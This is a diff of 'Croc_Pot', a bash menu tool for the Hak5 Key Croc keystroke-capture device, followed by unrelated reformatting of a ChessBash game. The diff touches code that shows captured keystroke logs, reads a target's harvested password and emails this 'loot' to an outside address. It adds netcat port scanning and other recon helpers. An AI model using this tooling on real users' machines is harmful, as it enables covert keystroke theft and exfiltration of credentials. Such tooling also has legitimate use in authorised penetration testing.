@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.5.8
+# Version:       1.5.9
 # Category:      Key Croc
 ##
 ##
@@ -72,7 +72,7 @@ function croc_title() {
 #----Test internet connection
 ##
 internet_test() {
-	ping -q -c1 -w 1 "8.8.8.8" &>"/dev/null"
+	ping -q -c 1 -w 1 "8.8.8.8" &>"/dev/null"
 if [[ "${?}" -ne 0 ]]; then
 	echo -ne "${red}Offline"
 elif [[ "${#args[@]}" -eq 0 ]]; then
@@ -96,8 +96,8 @@ fi
 ${red}${LINE_A}${clear}\e[40m»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]} ${clear}\e[40m«${clear}${red}---------${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
 ${red}   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)$(FILL_IN)${clear}
 ${red}   DATE OF SCAN${clear}\e[40m $(date +%b-%d-%y---%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.5.8${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
-\e[41;38;5;232m${LINE}${clear}\n\n"	
+${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.5.9${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[41;38;5;232m${LINE}${clear}\n\n"
 }
 ##
 #----Croc_Pot title for loot
@@ -106,7 +106,7 @@ function croc_title_loot() {
 	echo -ne "\n${LINE}\n\t${LINE_A}>KEYCROC-HAK5<${LINE_A}\n\t\tDEVELOPED BY SPYWILL\n\t\tDATE OF SCAN-$(date +%b-%d-%y---%r)\n\t${LINE_A}>CROC_POT<${LINE_A}\n${LINE}\n\n"
 }
 ##
-#----Croc_Pot invalid entry 
+#----Croc_Pot invalid entry
 ##
 function invalid_entry() {
 	LED R
@@ -114,7 +114,7 @@ function invalid_entry() {
 	sleep 1
 }
 ##
-#----read user input  
+#----read user input
 ##
 function read_all() {
 	unset r_a
@@ -130,7 +130,7 @@ elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = LINUX ]; then
 	echo "LINUX"
 else
 	echo "${red}INVALID OS"
-fi
+fi 2> /dev/null
 }
 ##
 #----Array for special characters
@@ -151,7 +151,7 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
 elif [ "$(OS_CHECK)" = LINUX ]; then
 	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
-fi
+fi 2> /dev/null
 }
 ##
 #----Check for target pc passwd
@@ -161,6 +161,24 @@ if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
 	echo -ne "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\n"
 else
 	echo -ne "\e[5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')\n"
+fi 2> /dev/null
+}
+##
+#----Check for install package option to install
+##
+function install_package() {
+	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "${1}" 2>&1)"
+if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+read_all DOWNLOAD AND INSTALL ${2} Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+	apt -y install ${1} ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
+	${4} ;;
+*)
+	invalid_entry ; ${3} ;;
+esac
 fi
 }
 ##
@@ -197,6 +215,7 @@ MenuEnd
 	14) croc_title_loot | tee ${LOOT_LOG} ; echo -e "\t${LINE_}KEYSTROKES_LOG${LINE_}\n" | tee -a ${LOOT_LOG} ; cat /root/udisk/loot/croc_char.log | tee -a ${LOOT_LOG} ; croc_logs_mean ;;
 	15) main_menu ;;
 	0) exit 0 ;;
+	[bB]) main_menu ;;
 	*) invalid_entry ; croc_logs_mean ;;
 	esac
 }
@@ -208,9 +227,9 @@ function croc_mail() {
 	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
 	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
 	LED B
-	echo -ne "$(Info_Screen '-Send E-Mail with g-mail or OutLook
--Select g-mail or outlook then Enter your e-mail address
--Enter your e-mail password then Enter the e-mail to send to
+	echo -ne "$(Info_Screen '-Send E-Mail with gmail or OutLook
+-Select gmail or outlook then Enter e-mail address
+-Enter e-mail password then Enter the e-mail to send to
 -Add MESSAGE and/or Add Attachment')\n\n"
 ##
 #----User Smtp input Function
@@ -239,7 +258,7 @@ user_email_set() {
 user_input_passwd() {
 unset password
 unset chartCount
-echo -n "$(ColorBlue 'ENTER YOUR EMAIL PASSWORD AND PRESS [ENTER]:') "
+echo -n "$(ColorBlue 'ENTER E-MAIL PASSWORD AND PRESS [ENTER]:')"
 while IFS= read -r -n1 -s char; do
 case "$char" in
 $'\0')
@@ -258,9 +277,9 @@ done
 	echo $password >> ${USER_CR}
 	echo ""
 }
-read_all ENTER YOUR EMAIL AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
+read_all ENTER E-MAIL ADDRESS AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
 user_input_passwd
-read_all ENTER EMAIL TO SEND LOOT TO AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
+read_all ENTER E-MAIL TO SEND LOOT TO AND PRESS [ENTER] ; echo ${r_a} >> ${USER_CR}
 }
 ##
 #----Python file send Function
@@ -288,7 +307,7 @@ if [ -e "${1}" ]; then
 	python_v
 	echo -ne "$(ColorGreen 'THIS FILE') ${1} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})"
 else
-	echo -ne "\n${LINE_}\e[40;31;4;5mPLEASE RUN AN ${@:3:4} FIRST STARTING ${@:3:4}${clear}${LINE_}\n"
+	echo -ne "\n${LINE_}\e[40;31;4;5mPLEASE RUN ${@:3:4} FIRST STARTING ${@:3:4}${clear}${LINE_}\n"
 	${5}
 fi
 }
@@ -296,12 +315,12 @@ fi
 #----Mail Attachment Function
 ##
 send_file_e() {
-read_all ENTER THE PATH OF YOUR ATTACHMENT AND PRESS [ENTER]
-if [ -e "${r_a}" ]; then
+echo -ne "${blue}ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]:${clear}"; read s_a
+if [ -e "${s_a}" ]; then
 	local CHANGE_FILE="P"
-	local CHANGE_FILE_A="'${r_a}'"
+	local CHANGE_FILE_A="'${s_a}'"
 	python_v
-	echo -ne "\n$(ColorGreen 'THIS FILE') ${r_a} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})\n"
+	echo -ne "\n$(ColorGreen 'THIS FILE') ${s_a} $(ColorGreen 'WILL BE SENT \nTO THIS E-MAIL') $(sed -n 4p ${USER_CR})\n"
 else
 	echo -ne "\n${LINE_}\e[4;5m$(ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN')${clear}${LINE_}\n"
 fi
@@ -348,7 +367,7 @@ MenuEnd
 #----Python E-mail Function
 ##
 python_email() {
-	rm ${PYTHON_MAIL}
+	rm ${PYTHON_MAIL} 2> /dev/null
 	sleep 1
 	echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
 from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '$(sed -n 2p ${USER_CR})'\npassword = '$(sed -n 3p ${USER_CR})'\nsend_to_email = '$(sed -n 4p ${USER_CR})'\n
@@ -364,10 +383,11 @@ text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit
 #----Mail check for existing email
 ##
 if [ -e "${USER_CR}" ]; then
-read_all WOULD YOU LIKE TO USE EXISTING EMAIL SETTING Y/N AND PRESS [ENTER]
+echo -ne "${yellow}EXISTING E-MAIL${clear} ${green}$(sed -n 2p ${USER_CR})${clear}\n"
+read_all USE EXISTING E-MAIL CREDENTIALS Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
-	echo -ne "\n${LINE_}$(ColorGreen 'KEEPING EXISTING EMAIL SETTING')${LINE_}\n\n" ;;
+	echo -ne "\n${LINE_}$(ColorGreen 'KEEPING EXISTING E-MAIL CREDENTIALS')${LINE_}\n\n" ;;
 [nN] | [nN][oO])
 	rm ${USER_CR}
 	user_smtp
@@ -376,7 +396,7 @@ case $r_a in
 	invalid_entry ; croc_mail ;;
 esac
 else
-	echo -ne "\n${LINE_}\e[5m$(ColorRed 'NO EXISTING EMAIL SETTING WERE FOUND PLEASE ENTER YOUR EMAIL SETTING')${LINE_}\n\n"
+	echo -ne "\n${LINE_}\e[5m$(ColorRed 'NO EXISTING E-MAIL CREDENTIALS WERE FOUND PLEASE ENTER E-MAIL CREDENTIALS')${LINE_}\n\n"
 	user_smtp
 	user_email_set
 fi
@@ -388,7 +408,7 @@ case $r_a in
 [yY] | [yY][eE][sS])
 	unset MY_MESS_A
 	unset DEF_MESS
-	read_all ENTER YOUR MESSAGE AND PRESS [ENTER] ;;
+	read_all ENTER MESSAGE AND PRESS [ENTER] ;;
 [nN] | [nN][oO])
 	unset r_a
 	local DEF_MESS=$(perl -e 'print "KEYCROC-HAK5---DEVELOPED BY SPYWILL ---Croc_Mail"')
@@ -405,7 +425,7 @@ case $a_f in
 	mail_file ;;
 [nN] | [nN][oO])
 	unset FILE_A_B FILE_B_B FILE_C_B FILE_D_B FILE_E_B FILE_F_B FILE_G_B FILE_H_B FILE_I_B
-	echo -ne "\n$(ColorGreen 'SENDING EMAIL')\n" ;;
+	echo -ne "\n$(ColorGreen 'SENDING E-MAIL')\n" ;;
 *)
 	invalid_entry ; mail_file ;;
 esac
@@ -424,7 +444,7 @@ function croc_pot_plus() {
 croc_recon() {
 	echo -ne "$(Info_Screen 'Perform some basic recon scan')\n"
 ##
-#----Tcpdump Menu/Function
+#----Recon Tcpdump Menu/Function
 ##
 tcpdump_scan() {
 	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.pcap
@@ -447,11 +467,12 @@ MenuEnd
 	5) read_all ENTER TCPDUMP SCAN THEN PRESS [ENTER] && ${r_a} | tee ${LOOT_TCPDUMP} ; tcpdump_scan ;;
 	6) main_menu ;;
 	0) exit 0 ;;
+	[bB]) croc_recon ;;
 	*) invalid_entry ; tcpdump_scan ;;
 	esac
 }
 ##
-#----Nmap mean/Function
+#----Recon Nmap mean/Function
 ##
 function nmap_menu() {
 	local IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
@@ -511,61 +532,101 @@ MenuEnd
 	9) pc_scan ; nmap_menu ;;
 	10) main_menu ;;
 	0) exit 0 ;;
+	[bB]) croc_recon ;;
 	*) invalid_entry ; nmap_menu ;;
 	esac
 }
 ##
-#----Traceroute scan Function
+#----start all scan Function
+##
+scan_all() {
+	read_all START SCAN Y/N AND PRESS [ENTER]
+	case $r_a in
+[yY] | [yY][eE][sS])
+	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
+	${@:2} ${r_a} ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
+	croc_recon ;;
+*)
+	invalid_entry ; ${@::1} ;;
+esac
+}
+##
+#----Recon Traceroute scan Function
 ##
 traceroute_scan() {
 	clear
 	echo -ne "$(Info_Screen 'Traceroute scan enter IP or web site name')\n\n"
-	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
-	traceroute ${r_a}
+	scan_all traceroute_scan traceroute
 }
 ##
-#----Whois lookup scan Function
+#----Recon Whois lookup scan Function
 ##
 whois_scan() {
 	clear
 	echo -ne "$(Info_Screen 'Whois Lookup scan enter IP or web site name')\n\n"
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "whois" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-	read_all INSTALL WHOIS Y/N AND PRESS [ENTER]
-	case $r_a in
-	[yY] | [yY][eE][sS])
-		apt -y install whois ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n"
-		croc_recon ;;
-	*)
-		invalid_entry ; whois_scan ;;
-	esac
-	fi
-	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
-	whois ${r_a}
+	install_package whois WHOIS whois_scan croc_recon
+	scan_all whois_scan whois
 }
 ##
-#----DNS lookup scan Function
+#----Recon DNS lookup scan Function
 ##
 dns_scan() {
 	clear
 	echo -ne "$(Info_Screen 'DNS Lookup scan enter IP or web site name')\n\n"
-	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "dnsutils" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
-	read_all INSTALL DNSUTILS Y/N AND PRESS [ENTER]
+	install_package dnsutils DNSUTILS dns_scan croc_recon
+	scan_all dns_scan dig
+}
+##
+#----Recon Ping scan Function
+##
+target_ping() {
+	clear
+	echo -ne "$(Info_Screen 'Ping scan enter IP or web site name')\n\n"
+	scan_all target_ping ping -c 5 -w 5
+}
+##
+#----Recon Port scan with Netcat Function
+##
+target_port() {
+	clear
+	echo -ne "$(Info_Screen '-Port scan with Netcat enter IP or web site name
+-Port range will start at port 1 enter port range to stop
+-Click Ctrl+C to stop script')\n\n"
+	read_all START SCAN Y/N AND PRESS [ENTER]
 	case $r_a in
-	[yY] | [yY][eE][sS])
-		apt -y install dnsutils ;;
-	[nN] | [nN][oO])
-		echo -ne "\n$(ColorYellow 'Maybe next time')\n"
-		croc_recon ;;
-	*)
-		invalid_entry ; dns_scan ;;
-	esac
-	fi
+[yY] | [yY][eE][sS])
 	read_all ENTER IP OR WEB SITE NAME AND PRESS [ENTER]
-	dig ${r_a}
+	echo -ne "${blue}ENTER PORT RANGE FOR SCAN AND PRESS [ENTER]:${clear}"; read range_port
+	broken=0
+break_script() {
+	broken=1
+}
+	trap break_script SIGINT
+for (( PORT = 1; PORT < $range_port; ++PORT )); do
+	nc -z -w 1 "$r_a" "$PORT" < /dev/null;
+if [ $? -eq 0 ]; then
+	echo -ne "${green}Open port $PORT${clear}\n"
+elif [ $broken -eq 1 ]; then break
+fi
+done ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n"
+	croc_recon ;;
+*)
+	invalid_entry ; target_port ;;
+esac
+}
+##
+#----Recon SSL/TLS SSLScan Function
+##
+ssl_scan() {
+	clear
+	echo -ne "$(Info_Screen 'Scanning TLS/SSL configuration with SSLscan
+-SSLscan is a command-line tool example: sslscan googel.com:443')\n\n"
+	install_package sslscan SSLSCAN ssl_scan croc_recon
+	scan_all ssl_scan sslscan --no-failed
 }
 ##
 #----Recon scan menu
@@ -576,7 +637,10 @@ MenuColor 2 NMAP SCAN ; echo -ne "           ${clear}\n"
 MenuColor 3 TRACEROUTE SCAN ; echo -ne "     ${clear}\n"
 MenuColor 4 WHOIS LOOKUP SCAN ; echo -ne "   ${clear}\n"
 MenuColor 5 DNS LOOKUP SCAN ; echo -ne "     ${clear}\n"
-MenuColor 6 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
+MenuColor 6 PING TARGET SCAN ; echo -ne "    ${clear}\n"
+MenuColor 7 TARGET PORT SCAN ; echo -ne "    ${clear}\n"
+MenuColor 8 SSL/TLS SSLSCAN ; echo -ne "     ${clear}\n"
+MenuColor 9 RETURN TO MAIN MENU ; echo -ne " ${clear}\n"
 MenuEnd
 	case $m_a in
 	1) tcpdump_scan ; croc_recon ;;
@@ -584,8 +648,12 @@ MenuEnd
 	3) traceroute_scan ; croc_recon ;;
 	4) whois_scan ; croc_recon ;;
 	5) dns_scan ; croc_recon ;;
-	6) main_menu ;;
+	6) target_ping ; croc_recon ;;
+	7) target_port ; croc_recon ;;
+	8) ssl_scan ; croc_recon ;;
+	9) main_menu ;;
 	0) exit 0 ;;
+	[bB]) menu_B ;;
 	*) invalid_entry ; croc_recon ;;
 	esac
 }
@@ -804,18 +872,7 @@ setup_vpn() {
 ##
 #----VPN Check/install openvpn
 ##
-local status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "openvpn" 2>&1)"
-if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
-	read_all INSTALL OPENVPN Y/N AND PRESS [ENTER]
-case $r_a in
-[yY] | [yY][eE][sS])
-	apt -y install openvpn ;;
-[nN] | [nN][oO])
-	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-*)
-	invalid_entry ; croc_vpn ;;
-esac
-fi
+	install_package openvpn OPENVPN setup_vpn croc_vpn
 ##
 #----VPN user input
 ##
@@ -852,6 +909,7 @@ MenuEnd
 	6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;;
 	7) main_menu ;;
 	0) exit 0 ;;
+	[bB]) menu_B ;;
 	*) invalid_entry ; croc_vpn ;;
 	esac
 }
@@ -966,10 +1024,10 @@ exit 1
 #	$1	name of executable
 function require() {
 	type "$1" >/dev/null 2>&1 ||
-	{
-		echo "This requires $1 but it is not available on your system. Aborting." >&2
-		exit 1
-	}
+{
+	echo "This requires $1 but it is not available on your system. Aborting." >&2
+	exit 1
+}
 }
 # Validate a number string
 # Params:
@@ -1105,15 +1163,13 @@ while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
 		remoteip="$OPTARG"
 	else
 		namePlayerA="$OPTARG"
-	fi
-;;
+	fi ;;
 	A )	if ! getColor "$OPTARG" ; then
 		colorPlayerA=$?
 	else
 		echo "'$OPTARG' is not a valid color!" >&2
 		exit 1
-	fi
-;;
+	fi ;;
 	b )	if [[ -z "$OPTARG" ]] ;then
 		echo "No valid name for second player specified!" >&2
 		exit 1
@@ -1121,81 +1177,61 @@ while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
 		remote=1
 	else
 		namePlayerB="$OPTARG"
-	fi
-;;
+	fi ;;
 	B )	if ! getColor "$OPTARG" ; then
 		colorPlayerB=$?
 	else
 		echo "'$OPTARG' is not a valid color!" >&2
 	exit 1
-	fi
-;;
+	fi ;;
 	s )	if validNumber "$OPTARG" ; then
 		strength=$OPTARG
 	else
 		echo "'$OPTARG' is not a valid strength!" >&2
 	exit 1
-	fi
-;;
+	fi ;;
 	P )	if validPort "$OPTARG" ; then
 		port=$OPTARG
 	else
 		echo "'$OPTARG' is not a valid gaming port!" >&2
 		exit 1
-	fi
-;;
+	fi ;;
 	w )	if validNumber "$OPTARG" ; then
 		sleep=$OPTARG
 	else
 		echo "'$OPTARG' is not a valid waiting time!" >&2
 	exit 1
-	fi
-;;
+	fi ;;
 	c )	if [[ -z "$OPTARG" ]] ; then
 		echo "No valid path for cache file!" >&2
 		exit 1
 	else
 		cache="$OPTARG"
-	fi
-;;
+	fi ;;
 	t )	if validNumber "$OPTARG" ; then
 		computer=$OPTARG
 	else
 		echo "'$OPTARG' is not a valid number for steps!" >&2
 		exit 1
-	fi
-;;
-	d )	color=false
-		;;
-	g )	guiconfig=true
-		;;
-	l )	unicodelabels=false
-		;;
-	n )	colorFill=false
-		;;
-	m )	colorHelper=false
-		;;
-	M )	mouse=false
-		;;
+	fi ;;
+	d )	color=false ;;
+	g )	guiconfig=true ;;
+	l )	unicodelabels=false ;;
+	n )	colorFill=false ;;
+	m )	colorHelper=false ;;
+	M )	mouse=false ;;
 	p )	ascii=true
-		unicodelabels=false
-		;;
-	i )	warnings=true
-		;;
-	v )	version
-		;;
-	V )	cursor=false
-		;;
+		unicodelabels=false ;;
+	i )	warnings=true ;;
+	v )	version ;;
+	V )	cursor=false ;;
 	z )	require gzip
 		require zcat
-		cachecompress=true
-		;;
+		cachecompress=true ;;
 	h )	help
-		exit 0
-		;;
+		exit 0 ;;
 	\?)
-		echo "Invalid option: -$OPTARG" >&2
-		;;
+		echo "Invalid option: -$OPTARG" >&2 ;;
 	esac
 done
 # get terminal dimension
@@ -1211,245 +1247,237 @@ fi
 # gui config
 if $guiconfig ; then
 # find a dialog system
-	if type gdialog >/dev/null 2>&1 ; then
-		dlgtool="gdialog"
-		dlgh=0
-		dlgw=100
-	elif type dialog >/dev/null 2>&1 ; then
-		dlgtool="dialog"
-		dlgh=0
-		dlgw=0
-	elif type whiptail >/dev/null 2>&1 ; then
-		dlgtool="whiptail"
-		dlgh=0
-		dlgw=$(( termWidth-10 ))
-	else
-		dlgtool=""
-		error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
-	fi
+if type gdialog >/dev/null 2>&1 ; then
+	dlgtool="gdialog"
+	dlgh=0
+	dlgw=100
+elif type dialog >/dev/null 2>&1 ; then
+	dlgtool="dialog"
+	dlgh=0
+	dlgw=0
+elif type whiptail >/dev/null 2>&1 ; then
+	dlgtool="whiptail"
+	dlgh=0
+	dlgw=$(( termWidth-10 ))
+else
+	dlgtool=""
+	error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
+fi
 # Output the type of the first player in a readable string
 	function typeOfPlayerA() {
-		if [[ "$remote" -eq "-1" ]] ; then
-			echo "Connect to $remoteip (Port $port)"
-			return 2
-		elif isAI $A ; then
-			echo "Artificial Intelligence (with strength $strength)"
-			return 1
-		else
-			echo "Human named $namePlayerA"
-			return 0
-		fi
-	}
+	if [[ "$remote" -eq "-1" ]] ; then
+		echo "Connect to $remoteip (Port $port)"
+		return 2
+	elif isAI $A ; then
+		echo "Artificial Intelligence (with strength $strength)"
+		return 1
+	else
+		echo "Human named $namePlayerA"
+		return 0
+	fi
+}
 # Output the type of the second player in a readable string
 	function typeOfPlayerB() {
-		if [[ "$remote" -eq "1" ]] ; then
-			echo "Host server at port $port"
-			return 2
-		elif isAI $B ; then
-			echo "Artificial Intelligence (with strength $strength)"
-			return 1
-		else
-			echo "Human named $namePlayerB"
-			return 0
-		fi
-	}
+	if [[ "$remote" -eq "1" ]] ; then
+		echo "Host server at port $port"
+		return 2
+	elif isAI $B ; then
+		echo "Artificial Intelligence (with strength $strength)"
+		return 1
+	else
+		echo "Human named $namePlayerB"
+		return 0
+	fi
+}
 # Execute a dialog
 # Params: Dialog params (variable length)
 # Prints: Dialog output seperated by new lines
 # Returns the dialog program return or 255 if no dialog tool available
 	function dlg() {
-		if [[ -n "$dlgtool" ]] ; then
-			$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
-			return ${PIPESTATUS[0]}
-		else
-			return 255
-		fi
-	}
+	if [[ -n "$dlgtool" ]] ; then
+		$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
+		return ${PIPESTATUS[0]}
+	else
+		return 255
+	fi
+}
 # Print a message box with a warning/error message
 # Params:
 #	$1	Message
 	function dlgerror() {
 #TODO: normal error
-		dlg --msgbox "$1" $dlgh $dlgw
-	}
+	dlg --msgbox "$1" $dlgh $dlgw
+}
 # Start the dialog configuration
 # Neither params nor return, this is just a function for hiding local variables!
 	function dlgconfig() {
-		local option_mainmenu_playerA="First Player"
-		local option_mainmenu_playerB="Second Player"
-		local option_mainmenu_settings="Game settings"
-		local dlg_on="ON"
-		local dlg_off="OFF"
-		declare -a option_player=( "Human" "Computer" "Network" )
-		declare -a option_settings=( "Color support" "Unicode support" "Verbose Messages" "Mouse support" "AI Cache" )
-		local dlg_main
-		while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache") ; do
-			case "$dlg_main" in
+	local option_mainmenu_playerA="First Player"
+	local option_mainmenu_playerB="Second Player"
+	local option_mainmenu_settings="Game settings"
+	local dlg_on="ON"
+	local dlg_off="OFF"
+	declare -a option_player=( "Human" "Computer" "Network" )
+	declare -a option_settings=( "Color support" "Unicode support" "Verbose Messages" "Mouse support" "AI Cache" )
+	local dlg_main
+	while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache") ; do
+		case "$dlg_main" in
 # Player A settings
-				"$option_mainmenu_playerA" )
-					typeOfPlayerA > /dev/null
-					local type=$?
-					local dlg_player
-					dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
-					case "$dlg_player" in
+	"$option_mainmenu_playerA" )
+		typeOfPlayerA > /dev/null
+		local type=$?
+		local dlg_player
+		dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
+		case "$dlg_player" in
 # Human --> get Name
-						*"${option_player[0]}"* )
-							[[ "$remote" -eq "-1" ]] && remote=0
-							local dlg_namePlayer
-							dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
-							;;
+	*"${option_player[0]}"* )
+		[[ "$remote" -eq "-1" ]] && remote=0
+		local dlg_namePlayer
+		dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
+		;;
 # Computer --> get Strength
-						*"${option_player[1]}"* )
-							[[ "$remote" -eq "-1" ]] && remote=0
-							namePlayerA=$aikeyword
-							local dlg_strength
-							if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
-								if validNumber "$dlg_strength" ; then
-									strength=$dlg_strength
-								else
-									dlgerror "Your input '$dlg_strength' is not a valid number!"
-								fi
-							fi
-							;;
+	*"${option_player[1]}"* )
+	[[ "$remote" -eq "-1" ]] && remote=0
+		namePlayerA=$aikeyword
+		local dlg_strength
+	if dlg_strength=$(dlg --inputbox "Strength of Computer" $dlgh $dlgw  "$strength") ; then
+	if validNumber "$dlg_strength" ; then
+		strength=$dlg_strength
+	else
+		dlgerror "Your input '$dlg_strength' is not a valid number!"
+	fi
+	fi ;;
 # Network --> get Server and Port
-						*"${option_player[2]}"* )
-							local dlg_remoteip
-							if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip") ; then
-								if validIP "$dlg_remoteip" ; then
-									remote=-1
-									remoteip="$dlg_remoteip"
-									local dlg_networkport
-									if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
-										 if validPort "$dlg_networkport" ; then
-											port=$dlg_networkport
-										else
-											dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
-										fi
-									fi
-								else
-									dlgerror "Your input '$dlg_remoteip' is no valid IP address!"
-									continue
-								fi
-							fi
-							;;
-					esac
+	*"${option_player[2]}"* )
+		local dlg_remoteip
+	if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip") ; then
+	if validIP "$dlg_remoteip" ; then
+		remote=-1
+		remoteip="$dlg_remoteip"
+		local dlg_networkport
+	if dlg_networkport=$(dlg --inputbox "Server Port (non privileged)" $dlgh $dlgw "$port") ; then
+	if validPort "$dlg_networkport" ; then
+		port=$dlg_networkport
+	else
+			dlgerror "Your input '$dlg_remoteip' is not a valid Port!"
+	fi
+	fi
+	else
+		dlgerror "Your input '$dlg_remoteip' is no valid IP address!"
+	continue
+	fi
+	fi
+		;;
+esac
 # Player color
-					if $color ; then
-						local colorlist=""
-						local c
-						for (( c=1; c<7; c++ )) ; do
